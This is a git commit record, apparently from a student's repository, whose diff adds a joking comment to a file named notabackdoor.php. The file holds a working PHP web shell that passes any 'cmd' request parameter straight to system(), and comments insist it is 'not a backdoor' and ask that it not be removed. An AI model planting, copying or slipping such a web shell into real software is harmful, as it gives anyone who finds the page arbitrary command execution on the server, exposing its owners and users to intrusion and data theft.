85fa65d255e3fdc581a1a3d0ff14d75729a4dc6f
Thomas Hayen <r0720971@student.thomasmore.be>
2020-12-09 15:47:59 +0100

    Update notabackdoor.php

--- notabackdoor.php
+++ notabackdoor.php
@@ -1,3 +1,4 @@
 <!-- Not a backdoor -->
 <!-- pls no removerino -->
+<!-- xx sh4rks -->
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
